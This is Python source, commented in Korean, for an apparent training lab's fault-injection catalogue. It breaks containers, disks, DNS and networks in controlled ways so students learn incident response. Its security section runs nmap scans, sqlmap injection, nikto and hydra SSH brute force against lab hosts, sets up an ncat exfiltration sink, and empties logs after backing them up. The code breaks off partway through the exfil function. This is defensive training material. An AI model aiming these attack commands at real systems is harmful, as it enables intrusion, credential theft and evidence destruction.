"""kt66 고장 주입 카탈로그 — IT 계통 38종.

시설(OT) 10종은 envsim 이 물리 모델과 함께 갖고 있다. 여기 있는 것은 나머지 —
시스템·스토리지·네트워크·보안·부하다. 둘을 한 서비스에 합치지 않은 이유는 명확하다:
envsim 은 **물리 시뮬레이터**이고 여기는 **랩을 실제로 조작하는 서비스**다. 물리
엔진에 docker.sock 쓰기 권한을 주면 역할이 뒤섞이고, 시뮬레이션 버그가 인프라를
망가뜨리는 경로가 생긴다.

── 설계 원칙 ──────────────────────────────────────────────────────
① 원복이 주입보다 중요하다. state 형 주입은 반드시 revert 를 갖고, TTL 이 지나면
   자동으로 풀린다. 안 그러면 다음 조 실습에 앞 조의 고장이 그대로 남는다.
② 되돌릴 수 없는 조작은 넣지 않는다. 증적 삭제(sec_logtamper)처럼 '되돌리면 안 되는'
   것이 교보재인 경우에도 사전에 스냅샷을 떠 두고 강사가 복구할 수 있게 한다.
③ 관제 화면(noc)과 주입기 자신은 대상이 될 수 없다. 조종간은 살아 있어야 한다.
④ 화이트리스트만 받는다. 임의 명령을 실행하는 입구는 열지 않는다.

kind: state  = 상태를 바꾼다. revert 필요, TTL 적용
      action = 한 번 일어나고 끝난다(공격·부하 발생). 되돌릴 것이 없다
danger: 1 국소 · 2 서비스 영향 · 3 랩 전체 영향(강사 확인용)
"""
from __future__ import annotations

import asyncio
import contextlib
import re
from dataclasses import dataclass, field
from typing import Callable

import dk

# ── 대상 그룹 ──────────────────────────────────────────────────────
PROTECTED = {"kt66-noc", "kt66-injector"}          # 조종간은 못 끈다

CHAIN = ["kt66-fw", "kt66-ips", "kt66-web"]
APPS = ["kt66-juiceshop", "kt66-dvwa", "kt66-neobank", "kt66-govportal",
        "kt66-mediforum", "kt66-adminconsole", "kt66-aicompanion"]
SIEM = ["kt66-siem", "kt66-wazuh-indexer", "kt66-wazuh-dashboard"]
MGMT = ["kt66-portal", "kt66-bastion", "kt66-envsim", "kt66-gpu-gw"]
# tc/netem 은 NET_ADMIN 이 있어야 한다. 취약 웹앱에는 그 권한을 주지 않았다 —
# 넣으면 되지만, 일부러 권한을 최소로 둔 것이라 그대로 둔다.
NETCAP = ["kt66-fw", "kt66-ips", "kt66-web", "kt66-attacker", "kt66-bastion", "kt66-gpu-gw"]
# 셸이 없는 이미지(distroless)는 exec 형 주입을 못 받는다. 대신 stop/자원제한은 된다.
NOSHELL = {"kt66-juiceshop"}

ALL = CHAIN + APPS + SIEM + MGMT + ["kt66-attacker"]
SHELL_OK = [c for c in ALL if c not in NOSHELL]
DISK_TARGETS = [c for c in CHAIN + SIEM + MGMT if c not in NOSHELL]

ATTACKER = "kt66-attacker"
DGX = "10.20.50.10"


def mark(h: str) -> str:
    """장기 실행 프로세스에 붙이는 표식. 원복은 이걸로 찾아 죽인다."""
    return f"kt66inj_{h}"


async def sh_bg(c: str, script: str, h: str):
    """배경 실행. 표식을 명령줄에 남겨야 나중에 확실히 잡을 수 있다."""
    await dk.sh(c, f"({script}) >/dev/null 2>&1 & echo {mark(h)} >/dev/null", detach=True)


# 배경 프로세스 정리 스크립트. **procps(pkill)에 의존하지 않는다.**
#
# 두 가지에 데였다.
#   ① `pkill -f` 는 자기 자신의 명령줄도 훑는다 → 킬러 셸이 스스로를 먼저 죽이고
#      뒤에 오는 명령이 아예 실행되지 않는다.
#   ② 이미지에 따라 pkill 이 없다(kt66-portal). `2>/dev/null; true` 가 실패를 삼켜
#      **원복이 조용히 아무 일도 안 했다** — 원칙 ①을 정면으로 어기는 버그였다.
#
# 그래서 /proc 를 직접 훑고 셸 빌트인 kill 로 죽인다. 자기 PID 는 건너뛴다.
# 죽인 개수를 돌려주므로 호출부가 '정말 정리됐는지' 확인할 수 있다.
#
#   ③ **case 패턴에 공백이 들어가면 dash 가 통째로 문법 오류를 낸다.**
#      `case $cl in *curl -s -m*)` → "Syntax error: word unexpected".
#      패턴 목록이 하나라도 어긋나면 case 문 전체가 죽으므로 핸들 표식까지
#      함께 무력화된다. 즉 원복이 **아무것도 죽이지 않고 성공을 보고**했다.
#      2026-08-13 실측: 원복 경로 10곳 중 8곳이 이 상태였다(공백 포함 패턴).
#      그래서 아래 kill_bg 가 문자 부분을 따옴표로 감싸 넘긴다 — 별표는 밖에 둔다.
KILL_SH = """n=0
for d in /proc/[0-9]*; do
  pid=${d#/proc/}
  [ "$pid" = "$$" ] && continue
  cl=$(tr '\\0' ' ' < "$d/cmdline" 2>/dev/null) || continue
  case "$cl" in
    %s) kill -9 "$pid" 2>/dev/null && n=$((n+1)) ;;
  esac
done
echo "killed=$n" """


async def kill_bg(c: str, h: str | None = None, *extra: str) -> int:
    """표식으로 배경 프로세스를 죽이고 **죽인 개수**를 돌려준다.

    패턴의 문자 부분은 반드시 따옴표로 감싼다(위 ③). 큰따옴표가 들어간 패턴은
    감쌀 수 없으므로 아예 거절한다 — 조용히 통과시키면 또 같은 함정이다.
    """
    pats = ([mark(h)] if h else []) + list(extra)
    pats = [p for p in pats if p]
    if not pats:
        return 0
    bad = [p for p in pats if '"' in p]
    if bad:
        raise ValueError(f"kill 패턴에 큰따옴표를 쓸 수 없다: {bad}")
    out = await dk.sh(c, KILL_SH % "|".join(f'*"{p}"*' for p in pats))
    if "Syntax error" in (out or "") or "killed=" not in (out or ""):
        # 조용히 0 을 돌려주면 원복 실패가 성공으로 보고된다. 그게 원래 버그였다.
        raise RuntimeError(f"정리 스크립트가 실행되지 않았다: {out!r}")
    m = re.search(r"killed=(\d+)", out)
    return int(m.group(1)) if m else 0


# 앞 세션이 비정상 종료하면 핸들을 알 수 없다. 그때는 접두어 하나로 싹 쓸어야 한다.
# `kt66inj_` 표식뿐 아니라 파일 경로(/var/tmp/kt66-inj-*, kt66-io-*)로도 잡는다 —
# 배경 루프의 명령줄에는 둘 중 하나가 반드시 들어 있다.
KILL_PREFIXES = ("kt66inj_", "kt66-inj-", "kt66-io-")


async def kill_orphans(c: str) -> int:
    """대상 컨테이너에 남아 있는 주입 배경 프로세스를 전부 죽이고 개수를 돌려준다."""
    return await kill_bg(c, None, *KILL_PREFIXES)


@dataclass
class Inj:
    id: str
    domain: str
    name: str
    desc: str
    teaches: str
    kind: str                       # state | action
    danger: int
    targets: list[str]
    apply: Callable
    revert: Callable | None = None
    params: list[dict] = field(default_factory=list)
    ttl: int = 900
    scenarios: list[str] = field(default_factory=list)


C: list[Inj] = []
def reg(**kw):
    C.append(Inj(**kw))


# ══════════════════════════════════════════════════════════════════
# 시스템 · 프로세스 (7)
# ══════════════════════════════════════════════════════════════════
reg(id="proc_stop", domain="system", name="서비스 정지", danger=2, kind="state",
    desc="컨테이너를 정상 종료(SIGTERM)한다. 헬스체크 실패와 503 이 뒤따른다.",
    teaches="재시작 전에 로그를 확보하는 습관. 여기서 안 잡히면 이후 난이도에서 증거가 매번 사라진다.",
    scenarios=["FLT-01"], targets=ALL, ttl=600,
    apply=lambda t, p, h: dk.stop(t),
    revert=lambda t, pl: dk.start(t))

reg(id="proc_kill", domain="system", name="비정상 종료 (SIGKILL)", danger=2, kind="state",
    desc="정리할 틈 없이 강제 종료한다. 종료 코드와 마지막 로그가 정상 종료와 다르다.",
    teaches="종료 코드로 원인을 가르는 법. SIGTERM 과 SIGKILL 의 흔적 차이.",
    scenarios=["FLT-01"], targets=ALL, ttl=600,
    apply=lambda t, p, h: dk.kill(t),
    revert=lambda t, pl: dk.start(t))

reg(id="proc_pause", domain="system", name="프로세스 정지(freeze)", danger=2, kind="state",
    desc="컨테이너를 얼린다. **살아 있는데 응답이 없다** — 프로세스도 포트도 그대로다.",
    teaches="'죽었나 느린가'를 가르는 훈련. 헬스체크는 타임아웃인데 docker ps 는 Up 이다. "
            "정지보다 훨씬 헷갈리고 실무에서 훨씬 흔하다.",
    scenarios=["INC-01", "FLT-01"], targets=ALL, ttl=420,
    apply=lambda t, p, h: dk.pause(t),
    revert=lambda t, pl: dk.unpause(t))


async def _restart_loop(t, p, h):
    """죽였다 되살리기를 반복한다.

    ★ 되살리는 일을 **직접** 해야 한다. 예전엔 죽이기만 하고 도커의 restart
      정책이 되살려 주기를 기대했는데, `unless-stopped` 는 docker kill 로 죽은
      컨테이너를 되살리지 않는다. 실측: period=8 로 걸어 두고 30초를 봤더니
      RestartCount 는 0 인 채 상태가 `exited` 로 굳어 있었다. 즉 이 주입은
      이름과 달리 **루프가 아니라 일회성 정지**였다 — proc_kill 과 같았다.
      한 번도 CrashLoop 을 보여 준 적이 없다.

    ★★ 그리고 죽이기와 되살리기를 **같은 try 로 묶으면 안 된다.** 이미 죽은
      컨테이너에 kill 을 보내면 도커가 409 를 낸다. 그 예외가 뒤따르는 start 까지
      건너뛰게 만들어서, 한 번 어긋난 뒤로는 영원히 exited 에 머문다. 되살리는
      코드를 넣고도 증상이 그대로였던 이유가 이것이었다 — 고쳤다고 생각하고
      넘어갈 뻔했다. 그래서 매 동작을 따로 감싸고, 보내기 전에 상태를 확인한다.
    """
    period = max(3.0, float(p.get("period", 20)))
    down = min(period / 2, 6.0)          # 내려가 있는 시간. 기동에 몇 초 걸린다

    async def loop():
        while True:
            await asyncio.sleep(period)
            with contextlib.suppress(Exception):
                if await dk.state_of(t) == "running":
                    await dk.kill(t)
            await asyncio.sleep(down)
            with contextlib.suppress(Exception):
                if await dk.state_of(t) != "running":
                    await dk.start(t)
    return {"task": asyncio.create_task(loop())}

async def _restart_loop_off(t, pl):
    pl["task"].cancel()
    await asyncio.sleep(0)
    # 루프가 죽인 직후에 해제될 수 있다. 살아 있는지 확인하고 아니면 올린다.
    for _ in range(3):
        if await dk.state_of(t) == "running":
            return
        try:
            await dk.start(t)
        except Exception:
            pass
        await asyncio.sleep(2.0)

reg(id="proc_restart_loop", domain="system", name="재시작 루프", danger=2, kind="state",
    desc="주기적으로 죽였다 되살린다. 서비스가 떴다 죽었다 하는 CrashLoop 처럼 보인다.",
    teaches="종료 코드(137)와 기동 시각(StartedAt)이 주기적으로 갱신되는 것을 읽는 법. "
            "루프를 먼저 멈춰야 로그가 안정적으로 읽힌다. RestartCount 는 움직이지 않는다 "
            "— 도커가 되살린 것이 아니기 때문이다. 그 차이를 읽는 것도 훈련이다.",
    scenarios=["FLT-04"], targets=ALL, ttl=600,
    params=[{"name": "period", "label": "주기(초)", "type": "int", "default": 20}],
    apply=_restart_loop, revert=_restart_loop_off)

reg(id="cpu_throttle", domain="system", name="CPU 기아", danger=2, kind="state",
    desc="CPU 할당을 조인다. 죽지 않고 느려진다 — 가장 진단하기 애매한 상태다.",
    teaches="자원 제한과 성능 저하의 연결. '느리다'를 수치로 바꾸는 훈련.",
    scenarios=["INC-01"], targets=ALL, ttl=600,
    params=[{"name": "cpus", "label": "CPU 코어", "type": "float", "default": 0.05}],
    apply=lambda t, p, h: dk.update(t, NanoCPUs=int(float(p.get("cpus", .05)) * 1e9)),
    # NanoCPUs=0 은 조용히 무시된다(오류 없이 제한이 그대로 남는다). dk.update 주석 참고.
    revert=lambda t, pl: dk.clear_cpu_limit(t))

reg(id="mem_limit", domain="system", name="메모리 제한 → OOM", danger=2, kind="state",
    desc="메모리 상한을 낮춘다. 한계를 넘으면 커널이 OOM 으로 죽인다.",
    teaches="요청 자원과 실사용량을 대조하는 법. OOM 은 애플리케이션 버그가 아닐 수 있다.",
    scenarios=["INC-05", "GPU-05"], targets=ALL, ttl=600,
    params=[{"name": "mb", "label": "메모리(MB)", "type": "int", "default": 64}],
    apply=lambda t, p, h: dk.update(t, Memory=int(p.get("mb", 64)) * 1024 * 1024,
                                    MemorySwap=int(p.get("mb", 64)) * 1024 * 1024),
    # Memory=0 도 마찬가지로 무시된다. update 로는 제한을 없앨 수 없어 최대치로 올린다.
    revert=lambda t, pl: dk.clear_mem_limit(t))


async def _netcut(t, p, h):
    nets = await dk.net_of(t)
    for n, ip in nets.items():
        await dk.net_disconnect(t, n)
    return {"nets": nets}

async def _netcut_off(t, pl):
    for n, ip in pl["nets"].items():
        try:
            await dk.net_connect(t, n, ip or None)
        except Exception:
            await dk.net_connect(t, n)

reg(id="net_isolate", domain="system", name="존에서 분리", danger=3, kind="state",
    desc="컨테이너를 모든 네트워크에서 떼어낸다. 살아 있지만 아무도 못 닿는다.",
    teaches="도달 불가와 서비스 다운의 구분. 고정 IP 를 기록해 두지 않으면 복구할 때 존이 어긋난다.",
    scenarios=["FLT-03", "DR-01"], targets=ALL, ttl=420,
    apply=_netcut, revert=_netcut_off)


# ══════════════════════════════════════════════════════════════════
# 스토리지 · 디스크 (5)
# ══════════════════════════════════════════════════════════════════
FILL = "/var/tmp/kt66-inj-fill"

reg(id="disk_fill", domain="storage", name="디스크 채움", danger=2, kind="state",
    desc="대용량 파일을 만들어 여유 공간을 소진한다.",
    teaches="무엇이 채웠는지 특정하고, 지워도 되는지 판단하는 순서.",
    scenarios=["FLT-02"], targets=DISK_TARGETS, ttl=900,
    params=[{"name": "mb", "label": "크기(MB)", "type": "int", "default": 2048}],
    apply=lambda t, p, h: dk.sh(t, f"fallocate -l {int(p.get('mb', 2048))}M {FILL}-{h}.bin "
                                   f"|| dd if=/dev/zero of={FILL}-{h}.bin bs=1M "
                                   f"count={int(p.get('mb', 2048))}"),
    revert=lambda t, pl: dk.sh(t, f"rm -f {FILL}-*.bin"))


async def _fill_slow(t, p, h):
    step, per = int(p.get("mb_step", 128)), float(p.get("period", 30))
    await sh_bg(t, f"while :; do dd if=/dev/zero bs=1M count={step} "
                   f">> {FILL}-{h}.bin 2>/dev/null; sleep {per}; done", h)
    return {}

async def _fill_slow_off(t, pl):
    await kill_bg(t, pl["_h"], "dd if=/dev/zero")
    await dk.sh(t, f"rm -f {FILL}-*.bin; true")

reg(id="disk_fill_slow", domain="storage", name="주기적 쓰기 (체크포인트 모사)", danger=2, kind="state",
    desc="일정 주기로 대용량을 덧쓴다. IO 스파이크가 규칙적으로 나타난다.",
    teaches="**주기성**을 읽는 법. 주기가 보이면 원인이 프로세스라는 뜻이고, 지워도 다시 찬다.",
    scenarios=["INC-07"], targets=DISK_TARGETS, ttl=1800,
    params=[{"name": "mb_step", "label": "회당(MB)", "type": "int", "default": 128},
            {"name": "period", "label": "주기(초)", "type": "int", "default": 30}],
    apply=_fill_slow, revert=_fill_slow_off)


async def _logflood(t, p, h):
    path = p.get("path") or "/var/log/kt66-inj-flood.log"
    await sh_bg(t, f"while :; do i=0; while [ $i -lt 400 ]; do "
                   f"echo \"$(date -Is) kt66 flood seq=$i src=10.20.30.202 \" >> {path}; "
                   f"i=$((i+1)); done; sleep 1; done", h)
    return {"path": path}

async def _logflood_off(t, pl):
    await kill_bg(t, pl["_h"])
    await dk.sh(t, f"rm -f {pl.get('path')}; true")

reg(id="log_flood", domain="storage", name="로그 폭주", danger=2, kind="state",
    desc="짧은 시간에 대량 로그를 쏟아 로그 파티션을 압박한다.",
    teaches="**내용을 읽고 나서** 조치한다. 급증 자체가 공격의 흔적일 수 있다. "
            "13주차 AGT-01(에이전트가 이 로그를 지워 버린다)의 재료다.",
    scenarios=["INC-09", "AGT-01"], targets=DISK_TARGETS, ttl=900,
    params=[{"name": "path", "label": "경로", "type": "str", "default": "/var/log/kt66-inj-flood.log"}],
    apply=_logflood,
    revert=_logflood_off)


reg(id="inode_exhaust", domain="storage", name="inode 소진", danger=2, kind="state",
    desc="작은 파일을 대량으로 만든다. **용량은 남았는데 쓰기가 실패한다.**",
    teaches="df 만 보면 정상이다. df -i 를 볼 줄 아는가가 전부인 시나리오.",
    scenarios=["FLT-02"], targets=DISK_TARGETS, ttl=900,
    params=[{"name": "count", "label": "파일 수", "type": "int", "default": 200000}],
    apply=lambda t, p, h: dk.sh(t, f"mkdir -p /var/tmp/kt66-inj-{h}; cd /var/tmp/kt66-inj-{h}; "
                                   f"i=0; while [ $i -lt {int(p.get('count', 200000))} ]; do "
                                   f": > f$i; i=$((i+1)); done", timeout=180),
    revert=lambda t, pl: dk.sh(t, "rm -rf /var/tmp/kt66-inj-*", timeout=180))


async def _logtamper(t, p, h):
    """지우기 전에 크기를 확인한다.

    ★ 원래 기본 경로가 /var/log/apache2/access.log 였는데, kt66 의 아파치는
      **사이트별 로그**(`<사이트>_port_access.log`)에 적고 저 파일은 항상 0 바이트다.
      즉 이 주입은 지울 것이 없는 파일을 지우고 200 을 돌려주고 있었다. 조사
      시나리오에서 "로그가 지워졌다"고 해 놓고 실제로는 아무것도 안 사라지면,
      학생은 멀쩡한 로그를 보며 없는 훼손을 찾게 된다. 실측으로 잡았다.

      실제로 쌓이는 곳:
        /var/log/apache2/<사이트>_port_access.log   (juice·dvwa·neobank·govportal…)
        /var/log/apache2/<사이트>_port_error.log
        /var/log/apache2/modsec_audit.log           (WAF 감사 — 전 사이트 공통)

    비어 있는 파일을 지우라고 하면 조용히 성공하는 대신 실패로 알린다.
    """
    path = p.get("path") or "/var/log/apache2/juice_port_access.log"
    bak = f"/var/tmp/kt66-evidence-{h}.bak"
    size = (await dk.sh(t, f"wc -c < {path} 2>/dev/null || echo -1") or "").strip()
    try:
        n = int(size.split()[0])
    except (ValueError, IndexError):
        n = -1
    if n < 0:
        raise RuntimeError(f"{path} 가 없다 — 훼손할 대상을 잘못 지정했다")
    if n == 0:
        raise RuntimeError(f"{path} 가 비어 있다 — 지워도 사라지는 것이 없으므로 "
                           f"조사 시나리오가 성립하지 않는다. params.path 를 확인하라")
    # 되돌릴 수 없는 조작은 넣지 않는다는 원칙 때문에, 지우기 전에 반드시 떠 둔다.
    # 학생에게는 '지워진 것'으로 보이고, 강사는 원본을 복구할 수 있다.
    await dk.sh(t, f"cp -f {path} {bak} 2>/dev/null; : > {path}")
    return {"path": path, "bak": bak, "erased_bytes": n}

reg(id="log_tamper", domain="storage", name="증적 훼손 (로그 삭제)", danger=3, kind="state",
    desc="로그 파일 내용을 비운다. 강사용 스냅샷은 따로 떠 둔다.",
    teaches="증적 훼손이 무엇을 잃게 하는지. 조사 가능 구간이 통째로 사라진다.",
    scenarios=["INC-09", "AGT-01", "AUD-01"], targets=DISK_TARGETS, ttl=1800,
    params=[{"name": "path", "label": "경로", "type": "str",
             "default": "/var/log/apache2/juice_port_access.log"}],
    apply=_logtamper,
    revert=lambda t, pl: dk.sh(t, f"cp -f {pl['bak']} {pl['path']} 2>/dev/null; "
                                  f"rm -f {pl['bak']}; true"))


# ══════════════════════════════════════════════════════════════════
# 네트워크 (8) — tc netem. NET_ADMIN 이 있는 컨테이너에만 건다.
# ══════════════════════════════════════════════════════════════════
IFACE = "eth0"
NETEM_OFF = f"tc qdisc del dev {IFACE} root 2>/dev/null; true"

reg(id="net_loss", domain="network", name="패킷 손실", danger=2, kind="state",
    desc="지정 비율로 패킷을 버린다. 재전송으로 느려지고 간헐적으로 끊긴다.",
    teaches="손실률과 체감 성능의 관계. TCP 는 소량 손실에도 처리량이 급락한다.",
    scenarios=["FLT-03"], targets=NETCAP, ttl=600,
    params=[{"name": "pct", "label": "손실률(%)", "type": "float", "default": 15}],
    apply=lambda t, p, h: dk.sh(t, f"{NETEM_OFF}; tc qdisc add dev {IFACE} root netem "
                                   f"loss {float(p.get('pct', 15))}%"),
    revert=lambda t, pl: dk.sh(t, NETEM_OFF))

reg(id="net_delay", domain="network", name="지연 · 지터", danger=2, kind="state",
    desc="패킷에 지연과 흔들림을 준다. 타임아웃이 상위 계층으로 전파된다.",
    teaches="계층별 절단. 어느 홉에서 지연이 붙는지 좁혀 들어가는 법.",
    scenarios=["INC-01", "INC-04"], targets=NETCAP, ttl=600,
    params=[{"name": "ms", "label": "지연(ms)", "type": "int", "default": 300},
            {"name": "jitter", "label": "지터(ms)", "type": "int", "default": 80}],
    apply=lambda t, p, h: dk.sh(t, f"{NETEM_OFF}; tc qdisc add dev {IFACE} root netem "
                                   f"delay {int(p.get('ms', 300))}ms {int(p.get('jitter', 80))}ms "
                                   f"distribution normal"),
    revert=lambda t, pl: dk.sh(t, NETEM_OFF))


async def _flap(t, p, h):
    down, up = float(p.get("down", 8)), float(p.get("up", 25))
    async def loop():
        while True:
            try:
                await dk.sh(t, f"{NETEM_OFF}; tc qdisc add dev {IFACE} root netem loss 100%")
                await asyncio.sleep(down)
                await dk.sh(t, NETEM_OFF)
            except Exception:
                pass
            await asyncio.sleep(up)
    return {"task": asyncio.create_task(loop())}

async def _flap_off(t, pl):
    pl["task"].cancel()
    await asyncio.sleep(0)
    await dk.sh(t, NETEM_OFF)

reg(id="net_flap", domain="network", name="링크 플랩 (간헐 장애)", danger=2, kind="state",
    desc="주기적으로 끊었다 붙인다. 볼 때는 정상이고 안 볼 때 끊긴다.",
    teaches="**재현 조건을 잡는 것이 원인 규명보다 먼저다.** 한 번 확인하고 정상 종결하면 오답.",
    scenarios=["FLT-03"], targets=NETCAP, ttl=1200,
    params=[{"name": "down", "label": "끊김(초)", "type": "int", "default": 8},
            {"name": "up", "label": "정상(초)", "type": "int", "default": 25}],
    apply=_flap, revert=_flap_off)

reg(id="net_bandwidth", domain="network", name="대역폭 제한", danger=2, kind="state",
    desc="전송 속도에 상한을 건다. 작은 요청은 멀쩡하고 큰 전송만 기어간다.",
    teaches="'느리다'의 원인이 처리 지연인지 대역인지 가르는 법.",
    scenarios=["INC-01"], targets=NETCAP, ttl=600,
    params=[{"name": "kbit", "label": "대역(kbit/s)", "type": "int", "default": 512}],
    apply=lambda t, p, h: dk.sh(t, f"{NETEM_OFF}; tc qdisc add dev {IFACE} root tbf "
                                   f"rate {int(p.get('kbit', 512))}kbit burst 32kbit latency 400ms"),
    revert=lambda t, pl: dk.sh(t, NETEM_OFF))


async def _mtu(t, p, h):
    cur = (await dk.sh(t, f"cat /sys/class/net/{IFACE}/mtu")).strip() or "1500"
    await dk.sh(t, f"ip link set dev {IFACE} mtu {int(p.get('mtu', 1200))}")
    return {"mtu": cur}

reg(id="net_mtu", domain="network", name="MTU 축소", danger=2, kind="state",
    desc="MTU 를 낮춘다. **ping 은 되는데 서비스는 안 된다** — 작은 패킷만 통과한다.",
    teaches="실무에서 가장 오래 헤매는 유형. 도달성 테스트가 통과하는데 왜 안 되는가. "
            "터널 구간(WireGuard)이 있는 kt66 에서는 특히 현실적이다.",
    scenarios=["FLT-03"], targets=NETCAP, ttl=600,
    params=[{"name": "mtu", "label": "MTU", "type": "int", "default": 1200}],
    apply=_mtu,
    revert=lambda t, pl: dk.sh(t, f"ip link set dev {IFACE} mtu {pl.get('mtu', 1500)}"))


async def _dnsbreak(t, p, h):
    cur = await dk.sh(t, "cat /etc/resolv.conf")
    await dk.sh(t, "printf 'nameserver 10.255.255.1\\n' > /etc/resolv.conf")
    return {"resolv": cur}

reg(id="net_dns", domain="network", name="DNS 장애", danger=2, kind="state",
    desc="이름 해석을 죽인다. IP 로는 되는데 이름으로는 안 된다.",
    teaches="이름과 주소를 분리해서 확인하는 습관.",
    scenarios=["FLT-03", "INC-01"], targets=[c for c in ALL if c not in NOSHELL], ttl=600,
    apply=_dnsbreak,
    revert=lambda t, pl: dk.sh(t, "cat > /etc/resolv.conf <<'EOF'\n" + pl["resolv"] + "\nEOF"))

reg(id="net_blackhole", domain="network", name="특정 목적지 차단", danger=2, kind="state",
    desc="한 대역으로 가는 길만 막는다. 다른 통신은 전부 정상이다.",
    teaches="'전체 장애'와 '구간 장애'의 구분. 어느 존으로 못 가는지가 곧 원인의 위치다.",
    scenarios=["FLT-03", "SEC-04"], targets=NETCAP, ttl=600,
    params=[{"name": "cidr", "label": "대상 대역", "type": "str", "default": "10.20.40.0/24"}],
    apply=lambda t, p, h: dk.sh(t, f"ip route add blackhole {p.get('cidr', '10.20.40.0/24')}"),
    revert=lambda t, pl: dk.sh(t, "ip route del blackhole "
                                  f"{pl.get('cidr', '10.20.40.0/24')} 2>/dev/null; true"))

reg(id="net_portblock", domain="network", name="포트 차단", danger=2, kind="state",
    desc="방화벽·IPS 에 차단 규칙을 넣는다. 서비스는 살아 있는데 도달이 막힌다.",
    teaches="룰셋을 읽고 무엇이 막혔는지 특정하는 법. 서비스 장애와 정책 장애의 구분.",
    scenarios=["CHG-02", "FLT-03"], targets=["kt66-fw", "kt66-ips"], ttl=600,
    params=[{"name": "port", "label": "포트", "type": "int", "default": 8001}],
    apply=lambda t, p, h: dk.sh(t, f"nft add table inet kt66inj 2>/dev/null; "
        f"nft add chain inet kt66inj blk '{{ type filter hook forward priority -5 ; }}' 2>/dev/null; "
        f"nft add rule inet kt66inj blk tcp dport {int(p.get('port', 8001))} counter drop"),
    revert=lambda t, pl: dk.sh(t, "nft delete table inet kt66inj 2>/dev/null; true"))


# ══════════════════════════════════════════════════════════════════
# 보안 (12) — attacker 컨테이너에서 실제로 실행한다.
#   Suricata(ips) · ModSecurity(web) · Wazuh 가 이미 받을 준비가 되어 있어
#   주입하면 진짜 탐지 이벤트가 SIEM 에 쌓인다. 시뮬레이션이 아니다.
# ══════════════════════════════════════════════════════════════════
WEB = "10.20.30.1"                                  # fw 의 ext 진입점
WEB_DMZ = "10.20.32.80"                             # dmz 의 web(ModSec) 실주소

reg(id="sec_portscan", domain="security", name="포트 스캔", danger=1, kind="action",
    desc="ext 존에서 dmz 웹으로 SYN 스캔을 돌린다. 체인을 통과하므로 Suricata 가 잡는다.",
    teaches="정찰 단계의 흔적을 읽는 법. 스캔은 공격의 시작이지 결과가 아니다. "
            "대상을 fw 의 ext 주소(10.20.30.1)로 바꿔서 돌려 보면 **아무것도 안 잡힌다** — "
            "그 SYN 은 fw 에서 끝나고 ips 를 지나지 않기 때문이다. 탐지기는 지나가는 것만 본다.",
    scenarios=["SEC-04"], targets=[ATTACKER], ttl=0,
    # 기본 대상이 dmz 실주소인 이유(2026-08-13 실측):
    #   10.20.30.1 로 1-1024 를 훑으면 DNAT 대상 포트(80/443)만 체인을 타고
    #   나머지 1022 개는 fw 에서 끝난다. Suricata 의 임계(10초에 SYN 30개)를
    #   못 채워 **경보가 하나도 안 뜬다.** 예전 기본값이 이거였다.
    #   10.20.32.80 로 훑으면 전량이 fw→ips→dmz 를 지나 경보가 뜬다(출처 .202 보존).
    params=[{"name": "target", "label": "대상", "type": "str", "default": WEB_DMZ},
            {"name": "ports", "label": "포트 범위", "type": "str", "default": "1-1024"}],
    apply=lambda t, p, h: sh_bg(t, f"nmap -sS -T4 -p {p.get('ports','1-1024')} "
                                   f"{p.get('target', WEB)}", h))

reg(id="sec_sqli", domain="security", name="SQL 인젝션 시도", danger=1, kind="action",
    desc="sqlmap 으로 취약 웹앱을 두드린다. ModSecurity 로그에 남는다.",
    teaches="WAF 로그에서 **진짜 출처 IP**를 읽는 법. kt66 은 출처 보존 설계라 .202 가 그대로 보인다.",
    scenarios=["SEC-03"], targets=[ATTACKER], ttl=0,
    params=[{"name": "url", "label": "대상 URL", "type": "str", "default": f"http://{WEB}:8002/"}],
    apply=lambda t, p, h: sh_bg(t, f"sqlmap --batch --crawl=1 --level=1 --flush-session "
                                   f"-u {p.get('url')}", h))

reg(id="sec_webscan", domain="security", name="웹 취약점 스캔", danger=1, kind="action",
    desc="nikto 로 웹 서버를 훑는다. 대량의 WAF 이벤트가 발생한다.",
    teaches="알림 폭주 속에서 원인 알림과 파생 알림을 가르는 훈련(INC-03 과 짝).",
    scenarios=["SEC-03", "INC-03"], targets=[ATTACKER], ttl=0,
    params=[{"name": "host", "label": "대상", "type": "str", "default": f"http://{WEB}:8001/"}],
    apply=lambda t, p, h: sh_bg(t, f"nikto -h {p.get('host')} -maxtime 300", h))

reg(id="sec_bruteforce", domain="security", name="무차별 대입", danger=1, kind="action",
    desc="hydra 로 SSH 로그인을 반복 시도한다. Wazuh 규칙이 발화한다.",
    teaches="인증 실패의 폭증을 계정 잠금(INC-02)과 공격으로 나누는 법.",
    scenarios=["SEC-04", "INC-02"], targets=[ATTACKER], ttl=0,
    params=[{"name": "target", "label": "대상", "type": "str", "default": "10.20.30.201"}],
    apply=lambda t, p, h: sh_bg(t, f"hydra -l admin -P /usr/share/wordlists/rockyou.txt "
                                   f"-t 4 -f ssh://{p.get('target')} 2>/dev/null || "
                                   f"for i in $(seq 1 60); do "
                                   f"sshpass -p wrong$i ssh -o StrictHostKeyChecking=no "
                                   f"-o ConnectTimeout=2 admin@{p.get('target')} true; done", h))

EXFIL_PORT = 4444


async def _exfil(t, p, h):
    """3F GPU 존에서 ext 로 대용량을 밀어낸다. **방향이 교보재다.**

    예전 구현은 attacker 가 웹(8001)으로 200MB 를 밀어 넣는 것이었다. 전송 자체는
    됐다 — 2026-08-13 실측에서 Suricata flow 에 233,196,286 B 로 남았다. 틀린 것은
    **방향**이다. 유출은 안에서 밖으로 나간다. 밖에서 웹으로 올리는 것은 업로드고,
    그걸로는 "이 아웃바운드가 백업인가 가중치 유출인가"를 물을 수 없다.

    그래서 수신 측(attacker)에 먼저 싱크를 띄우고, gpu-gw 에서 흘려보낸다.
    경로는 app(10.20.50) → ips → pipe → ext 라 **반드시 ips 를 지난다.**
    초당 chunk MB 로 나눠 보내므로 흐름이 눈에 보이는 시간 동안 지속된다.

    조사할 때 알아야 할 것: Suricata 의 flow 기록(=총 바이트)은 **세션이 끝나고
    타임아웃이 지난 뒤에** 나온다. 실시간으로는 anomaly/패킷만 보이고 총량은 몇 분
    뒤에 채워진다. 그래서 "지금 얼마나 나갔나"는 flow 로 못 본다 — 그걸 모르면
    학생은 로그가 없다고 결론 내린다.
    """
    mb, chunk = int(p.get("mb", 200)), max(1, int(p.get("chunk", 20)))
    port = int(p.get("port", EXFIL_PORT))
    # 수신 싱크 — 받은 것은 버린다. 표식을 붙여 원복 때 같이 죽인다.
    await sh_bg(ATTACKER, f"ncat -l -k -p {port} > /dev/null", h)
    await asyncio.sleep(1.0)
